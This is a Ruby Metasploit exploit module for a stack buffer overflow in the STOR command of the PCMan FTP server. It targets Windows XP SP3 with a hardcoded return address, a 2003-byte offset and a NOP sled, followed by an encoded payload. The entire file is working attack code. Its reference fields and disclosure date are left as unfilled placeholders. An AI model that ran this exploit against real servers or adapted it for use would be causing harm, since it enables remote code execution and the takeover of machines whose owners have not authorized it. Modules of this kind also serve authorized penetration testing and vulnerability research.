
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	#Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking
	#ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'FTP_PCMAN ',
			'Description'	=> %q{
					
					The STOR command of FTP PCman is vulnerable to basic stack buffer overflow 	
			},
			'License'		=> MSF_LICENSE,
			'Author'		=>
				[
					'rio atmadja <rioa@uw.edu>',	# Original discovery
					'<rio atmadja>',	# MSF Module
				],
			'References'	=>
				[
					[ 'OSVDB', '<insert OSVDB number here>' ],
					[ 'CVE', 'insert CVE number here' ],
					[ 'URL', '<insert another link to the exploit/advisory here>' ]
				],
			'DefaultOptions' =>
				{
					'ExitFunction' => 'process', #none/process/thread/seh
					#'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'	=> 'win',
			'Payload'	=>
				{
					'BadChars' => "\x00\xff\x0a\x0d\x20\x40", 
					'DisableNops' => true,
				},

			'Targets'		=>
				[
					[ 'Windows XP SP3 ',
						{
							'Ret'   	=>	0x7e429353,
							'Offset'	=>	2003
						}
					],
				],
			'Privileged'	=> false,
			#Correct Date Format: "M D Y"
			#Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec
			'DisclosureDate'	=> 'MONTH DAY YEAR',
			'DefaultTarget'	=> 0))

		register_options([Opt::RPORT(21)], self.class)

	end

	def exploit


		connect

		print_status("Trying target #{target.name}...")

		sploit = 'STOR' + '/../' + make_nops(target['Offset']) + [target.ret].pack('V') + make_nops(16) + payload.encoded 
		send_cmd( [sploit], false )

		handler
		disconnect

	end
end
